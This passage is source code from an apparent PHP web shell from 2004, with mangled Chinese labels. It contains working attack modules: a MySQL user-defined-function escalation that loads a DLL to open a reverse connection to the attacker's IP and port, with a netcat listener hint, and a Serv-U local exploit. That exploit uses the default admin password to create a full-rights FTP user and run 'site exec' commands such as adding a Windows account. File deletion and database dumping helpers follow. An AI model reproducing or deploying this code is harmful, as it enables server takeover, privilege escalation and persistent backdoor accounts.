                        21 => array("ʱ max_execution_time",getphpcfg("max_execution_time").""),
                        22 => array("õĺ disable_functions",$dis_func),
                        23 => array("phpinfo()",$phpinfo),
                        24 => array("Ŀǰпռdiskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
            25 => array("ͼδ GD Library",getfun("imageline")),
                        26 => array("IMAPʼϵͳ",getfun("imap_close")),
                        27 => array("MySQLݿ",getfun("mysql_close")),
                        28 => array("SyBaseݿ",getfun("sybase_close")),
                        29 => array("Oracleݿ",getfun("ora_close")),
                        30 => array("Oracle 8 ݿ",getfun("OCILogOff")),
                        31 => array("PREL﷨ PCRE",getfun("preg_match")),
                        32 => array("PDFĵ֧",getfun("pdf_close")),
                        33 => array("Postgre SQLݿ",getfun("pg_close")),
                        34 => array("SNMPЭ",getfun("snmpget")),
                        35 => array("ѹļ֧(Zlib)",getfun("gzclose")),
                        36 => array("XML",getfun("xml_set_object")),
                        37 => array("FTP",getfun("ftp_login")),
                        38 => array("ODBCݿ",getfun("odbc_close")),
                        39 => array("Session֧",getfun("session_start")),
                        40 => array("Socket֧",getfun("fsockopen")),
                ); 
        $tb->tableheader();
        echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
        $tb->tdbody('<b>鿴PHPò״</b>','left','1','30','style="padding-left: 5px;"');
        $tb->tdbody('ò(:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','鿴','','submit'),'left','2','30','style="padding-left: 5px;"');
        $tb->makehidden('do','viewphpvar');
        echo "</form>\n";
        $hp = array(0=> '', 1=> 'PHP', 2=> '֧״');
        for ($a=0;$a<3;$a++) {
                $tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
?>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?php
                if ($a==0) {
                        for($i=0;$i<=12;$i++) {
                                echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
                        }
                } elseif ($a == 1) {
                        for ($i=13;$i<=24;$i++) {
                                echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
                        }
                } elseif ($a == 2) {
                        for ($i=25;$i<=40;$i++) {
                                echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
                        }
                }
?>
      </table>
    </td>
  </tr>
<?php
        }//for
echo "</table>";
}//end phpenv

elseif($_GET['action'] == "mysqlfun"){
          echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
        if($_POST['port'] != "" && $_POST['ip'] != "" && $_POST['function'] != ""  && $_POST['host'] != "" && $_POST['user'] != "")
    {
                $link=@mysql_connect($_POST['host'],$_POST['user'],$_POST['pass']);
                if (!$link) {
                         echo "<font color=red>Could not connect: ".mysql_error()."</font><br>";
                         }
                         else{
                         echo "<font color=blue>Connected successfully as ".$_POST['user']."</font><br>";
                         if(isset($_POST['mixpath'])&&!@file_exists($_POST['mixpath'])){
                                 echo"<font color=red>Can't find the ".$_POST['mixpath']."</font><br>";
                         }
                                 if(isset($_POST['mixpath'])){
                         $dll_path = addslashes($_POST['mixpath']);
                         $query="create function ".$_POST['function']." returns integer soname '".$dll_path."';";
                         echo (@mysql_query($query, $link)) ? "<font color=blue>Success: ".$query."</font><br>" : "<font color=red>Create function faild!<br>".mysql_error()."</font><br>";
                         }
                         echo"<font color=red>Now Select Function name of ".$_POST['function']."</font><br>";
                         $query="select ".$_POST['function']."('".$_POST['ip']."','".$_POST['port']."');";
                         echo (@mysql_query($query, $link)) ? "<font color=blue>Success: ".$query."</font><br>" : "<font color=red>Select Function name of ".$_POST['function']." faild!<br>".mysql_error()."</font><br>";
                         mysql_close($link);
                         }
                         }else{
                         echo"Help?? View <A href=\"http://www.ph4nt0m.org/bbs/showthread.php?threadid=33006\" target=\"_blank\">http://www.ph4nt0m.org/bbs/showthread.php?threadid=33006</a>";
                         }
                         echo "</td></tr></table>";
                         if($nodll=="yes"){
                                 $echodll = " <a href=\"#\" title=\"ʹ˵\" onclick=\"alert('ļᱻaddslashes\\\\\\ \\\\\\\ȫдύ\\n\\nԼnc -vv -l -p ˿ڣȫmysql')\">(?)</a>&nbsp;    Mixdll:
      <input name=\"mixpath\" type=\"text\" class=\"INPUT\"  value=\"C:\mix.dll\" size=\"50\"> &nbsp;<a href=\"?action=mysqlfun\">(function)</a>";
                         }else{
                                 $echodll = "<FONT color=\"blue\">˲ѽfunctionй</FONT> &nbsp;<a href=\"?action=mysqlfun&nodll=yes\">(δfunction)</a>";
                         }
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">mysql_functionȨmix.dll</td>
  </tr>
  <form action="?action=mysqlfun" method="POST">
  <tr class="secondalt">
    <td align="center"><a href="?action=sql&type=fun">(Func)</a>&nbsp;ض˿:
      <input name="port" type="text" class="INPUT"  value="5438" size="6">      
      IP:
      <input name="ip" type="text" class="INPUT" value="<?=$_SERVER['REMOTE_ADDR']?>">     function:
      <input name="function" type="text" class="INPUT"  value="Mixconnect"> &nbsp;<a href="?action=mix">(Mix.dll)</a>
      <br>
          Host : <input name="host" type="text" class="INPUT"  value="localhost" size="12">        User : <input name="user" type="text" class="INPUT"  value="root" size="8">            PassWd : <input name="pass" type="text" class="INPUT"  value=""> <br>
          <?=$echodll?>
          <? echo"<input name=\"nodll\" value=\"".$nodll."\" type=\"hidden\">";?> </td>
  </tr>
  <tr class="secondalt">
    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="ִ">
      <input name="Submit" type="reset" class="INPUT" value=""></td>
  </tr>  
  </form>
    <tr class="secondalt">
    <td align="center">Remember,Love is a dieing dream....</td>
  </tr>
</table>
<?
}
elseif($_GET['action'] == "SUExp")
{
    if($_POST['SUPort'] != "" && $_POST['SUUser'] != "" && $_POST['SUPass'] != "")
    {
        echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
        $sendbuf = "";
        $recvbuf = "";
        $domain  = "-SETDOMAIN\r\n".
                "-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n".
                "-TZOEnable=0\r\n".
                " TZOKey=\r\n";
        $adduser = "-SETUSERSETUP\r\n".
                "-IP=0.0.0.0\r\n".
                "-PortNo=21\r\n".
                "-User=".$user."\r\n".
                "-Password=".$password."\r\n".
                "-HomeDir=c:\\\r\n".
                "-LoginMesFile=\r\n".
                "-Disable=0\r\n".
                "-RelPaths=1\r\n".
                "-NeedSecure=0\r\n".
                "-HideHidden=0\r\n".
                "-AlwaysAllowLogin=0\r\n".
                "-ChangePassword=0\r\n".
                "-QuotaEnable=0\r\n".
                "-MaxUsersLoginPerIP=-1\r\n".
                "-SpeedLimitUp=0\r\n".
                "-SpeedLimitDown=0\r\n".
                "-MaxNrUsers=-1\r\n".
                "-IdleTimeOut=600\r\n".
                "-SessionTimeOut=-1\r\n".
                "-Expire=0\r\n".
                "-RatioUp=1\r\n".
                "-RatioDown=1\r\n".
                "-RatiosCredit=0\r\n".
                "-QuotaCurrent=0\r\n".
                "-QuotaMaximum=0\r\n".
                "-Maintenance=None\r\n".
                "-PasswordType=Regular\r\n".
                "-Ratios=None\r\n".
                " Access=".$part."\|RWAMELCDP\r\n";
        $deldomain="-DELETEDOMAIN\r\n".
                     "-IP=0.0.0.0\r\n".
                     " PortNo=21\r\n";
        $sock = fsockopen("127.0.0.1", $_POST["SUPort"], &$errno, &$errstr, 10);
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "USER ".$_POST["SUUser"]."\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "SITE MAINTENANCE\r\n";
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = $domain;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = $adduser;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        echo "**********************************************************<br>";
                if($job!=="adduser"){//費ǽû
        echo "Starting Exploit ...<br>";
        echo "**********************************************************<br>";
        $exp = fsockopen("127.0.0.1", "21", &$errno, &$errstr, 10);
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "USER ".$user."\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "PASS ".$password."\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        $sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
        fputs($exp, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
        $recvbuf = fgets($exp, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
        echo "**********************************************************<br>";
        echo "Starting Delete Domain ...<br>";
        echo "**********************************************************<br>";
        $sendbuf = $deldomain;
        fputs($sock, $sendbuf, strlen($sendbuf));
        echo "<font color=blue>Send: $sendbuf</font><br>";
        $recvbuf = fgets($sock, 1024);
        echo "<font color=red>Recv: $recvbuf</font><br>";
                }else{
                        echo "All done ...<br>";
                        echo "**********************************************************<br>";
                }
        echo "</td></tr></table>";
        fclose($sock);
        if($job!=="adduser") fclose($exp);
    }
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">ͨServ-U عԱʺִ & </td>
  </tr>
  <form action="?action=SUExp" method="POST">
  <tr class="secondalt">
    <td align="center">LocalPort:
      <input name="SUPort" type="text" class="INPUT" id="SUPort" value="43958" size="7">      
      LocalUser:
      <input name="SUUser" type="text" class="INPUT" id="SUUser" value="LocalAdministrator">       LocalPass:
      <input name="SUPass" type="text" class="INPUT" id="SUPass" value="#l@$ak#.lk;0@P">
      <br>
          <?php
        if($job!=="adduser"){
        ?>
      Command:
      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user saiy saiy /add" size="50"> &nbsp;<a href="?action=SUExp&job=adduser">(û)</a> -  <a href="#" title="ʹ˵" onclick="alert('ѡûsaiyΪsaiyʺŲEXPɾsaiy\n\nûԼһԱʺõģִsite exec \n\nõһѡĿ¼ȫȨ޵')">(?)</a>
          <input name="user" type="hidden" value="saiy">
          <input name="password" type="hidden" value="saiy">
          <input name="part" type="hidden" value="C:\"> 
          <?}
          else{
        ?>
        ʺ:
      <input name="user" type="text" class="INPUT" value="saiy" size="20">  
          :
      <input name="password" type="text" class="INPUT" value="saiy" size="20">  
          Ŀ¼:
      <input name="part" type="text" class="INPUT" value="C:\" size="20">  
          <a href="?action=SUExp">(ִCMD)</a> -  <a href="#" title="ʹ˵" onclick="alert('صִ')">(?)</a>
          <input name="job" type="hidden" value="<?=$job?>"> 
        <?php
          }
                ?></td>
  </tr>
  <tr class="secondalt">
    <td align="center"><input name="Submit" type="submit" class="input" id="Submit" value="ִ">
      <input name="Submit" type="reset" class="INPUT" value=""></td>
  </tr>  
  </form>
</table>
<?php
}
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php
        debuginfo();
        ob_end_flush();        
        ?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php

/*======================================================

======================================================*/

        // ½
        function loginpage() {
        //global $amdin[alexa];
?>
<style type="text/css">
input {font-family: "Verdana";font-size: "11px";BACKGROUND-COLOR: "#FFFFFF";height: "18px";border: "1px solid #666666";}
</style>
<table width="416" border="0" align="center" cellpadding="0" cellspacing="0">
<form method="POST" action="">
  <tr> 
    <td height="75" align="center">
<span style="font-size: 11px; font-family: Verdana">PassWord: </span><input name="adminpass" type="password" size="20">
<input type="hidden" name="do" value="login">
<input type="submit" value="Login">
        </td>
  </tr>
  </form>
<?php
                exit;
        }//end loginpage()

        // ҳϢ
        function debuginfo() {
                global $starttime;
                $mtime = explode(' ', microtime());
                $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
                echo "Processed in $totaltime second(s)";
        }

        // ȥתַ
        function stripslashes_array(&$array) {
                while(list($key,$var) = each($array)) {
                        if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
                                if (is_string($var)) {
                                        $array[$key] = stripslashes($var);
                                }
                                if (is_array($var))  {
                                        $array[$key] = stripslashes_array($var);
                                }
                        }
                }
                return $array;
        }

        // ɾĿ¼
        function deltree($deldir) {
                $mydir=@dir($deldir);        
                while($file=$mydir->read())        {                 
                        if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
                                @chmod("$deldir/$file",0777);
                                deltree("$deldir/$file"); 
                        }
                        if (is_file("$deldir/$file")) {
                                @chmod("$deldir/$file",0777);
                                @unlink("$deldir/$file");
                        }
                } 
                $mydir->close(); 
                @chmod("$deldir",0777);
                return (@rmdir($deldir)) ? 1 : 0;
        } 

        // ж϶д
        function dir_writeable($dir) {
                if (!is_dir($dir)) {
                        @mkdir($dir, 0777);
                }
                if(is_dir($dir)) {
                        if ($fp = @fopen("$dir/test.txt", 'w')) {
                                @fclose($fp);
                                @unlink("$dir/test.txt");
                                $writeable = 1;
                        } else {
                                $writeable = 0;
                        }
                }
                return $writeable;
        }

        // мıɫ滻
        function getrowbg() {
                global $bgcounter;
                if ($bgcounter++%2==0) {
                        return "firstalt";
                } else {
                        return "secondalt";
                }
        }

        // ȡǰļϵͳ·
        function getPath($mainpath, $relativepath) {
                global $dir;
                $mainpath_info           = explode('/', $mainpath);
                $relativepath_info       = explode('/', $relativepath);
                $relativepath_info_count = count($relativepath_info);
                for ($i=0; $i<$relativepath_info_count; $i++) {
                        if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
                        if ($relativepath_info[$i] == '..') {
                                $mainpath_info_count = count($mainpath_info);
                                unset($mainpath_info[$mainpath_info_count-1]);
                                continue;
                        }
                        $mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
                } //end for
                return implode('/', $mainpath_info);
        }

        // PHPò
        function getphpcfg($varname) {
                switch($result = get_cfg_var($varname)) {
                        case 0:
                        return "No";
                        break;
                        case 1:
                        return "Yes";
                        break;
                        default:
                        return $result;
                        break;
                }
        }

        // 麯
        function getfun($funName) {
                return (false !== function_exists($funName)) ? "Yes" : "No";
        }

        // ѹ
        class zip //ZIPѹ
{

var $datasec, $ctrl_dir = array();
var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
var $old_offset = 0; var $dirs = Array(".");

function Add($files,$compact)
{
  if(!is_array($files[0])) $files=Array($files);

  for($i=0;$files[$i];$i++){
    $fn = $files[$i];
    if(!in_Array(dirname($fn[0]),$this->dirs))
     $this->add_Dir(dirname($fn[0]));
    if(basename($fn[0]))
     $ret[basename($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
  }
  return $ret;
}
function get_file()
{
   $data = implode('', $this -> datasec);
   $ctrldir = implode('', $this -> ctrl_dir);

   return $data . $ctrldir . $this -> eof_ctrl_dir .
    pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
}
function ReadCentralDir($zip,$zip_name)
{
  $size = filesize($zip_name);
  if ($size < 277) $maximum_size = $size;
  else $maximum_size=277;
  @fseek($zip, $size-$maximum_size);
  $pos = ftell($zip); $bytes = 0x00000000;
  while ($pos < $size)
  {
    $byte = @fread($zip, 1); $bytes=($bytes << 8) | Ord($byte);
    if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
  }
  $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));
  if ($data['comment_size'] != 0)
          $centd['comment'] = fread($zip, $data['comment_size']);
  else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
  $centd['disk_entries'] = $data['disk_entries'];
  $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
  $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
  return $centd;
}
  function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);
        if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';
        if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';
        if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';
        if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
}
function add_dir($name) 
{ 
   $name = str_replace("\\", "/", $name); 
   $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 

   $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 
   $this -> datasec[] = $fr;

   $new_offset = strlen(implode("", $this->datasec)); 

   $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
   $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
   $ext = "\xff\xff\xff\xff"; 
   $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name; 

   $this -> ctrl_dir[] = $cdrec; 
   $this -> old_offset = $new_offset; 
   $this -> dirs[] = $name;
}
function get_List($zip_name)
{
   $zip = @fopen($zip_name, 'rb');
   if(!$zip) return(0);
   $centd = $this->ReadCentralDir($zip,$zip_name);
   @rewind($zip);
    @fseek($zip, $centd['offset']);
        for ($i=0; $i<$centd['entries']; $i++)
   {
    $header = $this->ReadCentralFileHeaders($zip);
    $header['index'] = $i;$info['filename'] = $header['filename'];
    $info['stored_filename'] = $header['stored_filename'];
    $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
    $info['crc'] = strtoupper(dechex( $header['crc'] ));
    $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
    $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
    $info['index'] = $header['index'];$info['status'] = $header['status'];
    $ret[]=$info; unset($header);
   }
  return $ret;
}
function add_File($data, $name, $compact = 1)
{
   $name     = str_replace('\\', '/', $name);
   $dtime    = dechex($this->DosTime());

   $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
     . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
   eval('$hexdtime = "' . $hexdtime . '";');

   if($compact)
   $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
   else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
   $unc_len = strlen($data); $crc = crc32($data);

   if($compact){
     $zdata = gzcompress($data); $c_len = strlen($zdata);
     $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
   }else{
     $zdata = $data;
   }
   $c_len=strlen($zdata);
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;

   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);

   $this -> datasec[] = $fr;
   $new_offset        = strlen(implode('', $this->datasec));
   if($compact)
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
   else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
   $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
   $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
   $cdrec .= pack('V', $this -> old_offset );

   $this -> old_offset = $new_offset;
   $cdrec .= $name;
   $this -> ctrl_dir[] = $cdrec;
   return true;
}

function DosTime() {
   $timearray = getdate();
   if ($timearray['year'] < 1980) {
     $timearray['year'] = 1980; $timearray['mon'] = 1;
     $timearray['mday'] = 1; $timearray['hours'] = 0;
     $timearray['minutes'] = 0; $timearray['seconds'] = 0;
   }
   return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) |     ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | 
    ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
}
  function Extract ( $zn, $to, $index = Array(-1) )
{
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
     if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
      return(-1);
   }

   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
      $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
      
   }
   fclose($zip);
   return $stat;
}
function ExtractFile($header,$to,$zip)
{
   $header = $this->readfileheader($zip);

   if(substr($to,-1)!="/") $to.="/";
   if(!@is_dir($to)) @mkdir($to,0777);

   $pth = explode("/",dirname($header['filename']));
   for($i=0;isset($pth[$i]);$i++){
     if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
     if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
   }
  if (!($header['external']==0x41FF0010)&&!($header['external']==16))
  {
   if ($header['compression']==0)
   {
    $fp = @fopen($to.$header['filename'], 'wb');
    if(!$fp) return(-1);
    $size = $header['compressed_size'];

    while ($size != 0)
    {
      $read_size = ($size < 2048 ? $size : 2048);
      $buffer = fread($zip, $read_size);
      $binary_data = pack('a'.$read_size, $buffer);
      @fwrite($fp, $binary_data, $read_size);
      $size -= $read_size;
    }
    fclose($fp);
    touch($to.$header['filename'], $header['mtime']);

  }else{
   $fp = @fopen($to.$header['filename'].'.gz','wb');
   if(!$fp) return(-1);
   $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
     Chr(0x00), time(), Chr(0x00), Chr(3));

   fwrite($fp, $binary_data, 10);
   $size = $header['compressed_size'];

   while ($size != 0)
   {
     $read_size = ($size < 1024 ? $size : 1024);
     $buffer = fread($zip, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }

   $binary_data = pack('VV', $header['crc'], $header['size']);
   fwrite($fp, $binary_data,8); fclose($fp);

   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compresse");
    if(!$gzp) return(-2);
   $fp = @fopen($to.$header['filename'],'wb');
   if(!$fp) return(-1);
   $size = $header['size'];

   while ($size != 0)
   {
     $read_size = ($size < 2048 ? $size : 2048);
     $buffer = gzread($gzp, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }
   fclose($fp); gzclose($gzp);

   touch($to.$header['filename'], $header['mtime']);
   @unlink($to.$header['filename'].'.gz');

  }}
  return true;
}
   function ReadFileHeader($zip)
  { 
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }
}
function addziparray($dir2) //ZIPļ
{
        global $dir,$zipfilearray;
        @$dirs=opendir($dir."/".$dir2);
        while (@$file=readdir($dirs)) { 
                if(!is_dir("$dir/$dir2/$file")) {
                        $zipfilearray[]="$dir2/$file";
                }
                elseif($file!="."&&$file!="..") {
                        addziparray("$dir2/$file");
                }
        }
        @closedir($dirs);
}

        // ݿ
        function sqldumptable($table, $fp=0) {
                $tabledump = "DROP TABLE IF EXISTS $table;\n";
                $tabledump .= "CREATE TABLE $table (\n";

                $firstfield=1;

                $fields = mysql_query("SHOW FIELDS FROM $table");
                while ($field = mysql_fetch_array($fields)) {
                        if (!$firstfield) {
                                $tabledump .= ",\n";
                        } else {
                                $firstfield=0;
                        }
                        $tabledump .= "   $field[Field] $field[Type]";
                        if (!empty($field["Default"])) {
                                $tabledump .= " DEFAULT '$field[Default]'";
                        }
                        if ($field['Null'] != "YES") {
                                $tabledump .= " NOT NULL";
                        }
                        if ($field['Extra'] != "") {
                                $tabledump .= " $field[Extra]";
                        }
                }
                mysql_free_result($fields);
        
                $keys = mysql_query("SHOW KEYS FROM $table");
                while ($key = mysql_fetch_array($keys)) {
                        $kname=$key['Key_name'];
                        if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
                                $kname="UNIQUE|$kname";
                        }
                        if(!is_array($index[$kname])) {
                                $index[$kname] = array();
                        }
                        $index[$kname][] = $key['Column_name'];
                }
                mysql_free_result($keys);

                while(list($kname, $columns) = @each($index)) {
                        $tabledump .= ",\n";
                        $colnames=implode($columns,",");

                        if ($kname == "PRIMARY") {
                                $tabledump .= "   PRIMARY KEY ($colnames)";
                        } else {
                                if (substr($kname,0,6) == "UNIQUE") {
                                        $kname=substr($kname,7);
                                }
                                $tabledump .= "   KEY $kname ($colnames)";
                        }
                }

                $tabledump .= "\n);\n\n";
                if ($fp) {
                        fwrite($fp,$tabledump);
                } else {
                        echo $tabledump;
                }

                $rows = mysql_query("SELECT * FROM $table");
                $numfields = mysql_num_fields($rows);
                while ($row = mysql_fetch_array($rows)) {
                        $tabledump = "INSERT INTO $table VALUES(";

                        $fieldcounter=-1;
                        $firstfield=1;
                        while (++$fieldcounter<$numfields) {
                                if (!$firstfield) {
                                        $tabledump.=", ";
                                } else {
                                        $firstfield=0;
                                }

                                if (!isset($row[$fieldcounter])) {
                                        $tabledump .= "NULL";
                                } else {
                                        $tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
                                }
                        }

                        $tabledump .= ");\n";

                        if ($fp) {
                                fwrite($fp,$tabledump);
                        } else {
                                echo $tabledump;
                        }
                }
                mysql_free_result($rows);
        }

        class FORMS {
                function tableheader() {
                        echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
                }

                function headerform($arg=array()) {
                        global $dir;
                        if ($arg[enctype]){
                                $enctype="enctype=\"$arg[enctype]\"";
                        } else {
                                $enctype="";
                        }
                        if (!isset($arg[method])) {
                                $arg[method] = "POST";
                        }
                        if (!isset($arg[action])) {
                                $arg[action] = '';
